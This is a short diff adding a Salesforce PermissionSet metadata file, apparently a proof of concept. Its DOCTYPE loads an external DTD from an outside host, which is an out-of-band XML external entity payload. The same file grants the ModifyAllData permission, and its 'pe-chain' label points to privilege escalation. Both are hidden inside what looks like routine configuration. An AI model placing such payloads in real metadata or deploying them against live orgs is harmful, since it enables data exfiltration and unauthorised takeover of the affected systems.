@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE PermissionSet [ <!ENTITY % sp SYSTEM "https://oob.binary-man.in/clayton/pe-dtd.dtd"> %sp; ]>
+<PermissionSet xmlns="http://soap.sforce.com/2006/04/metadata">
+    <description>pe-chain</description>
+    <hasActivationRequired>false</hasActivationRequired>
+    <label>GsClayPe</label>
+    <userPermissions><enabled>true</enabled><name>ModifyAllData</name></userPermissions>
+</PermissionSet>
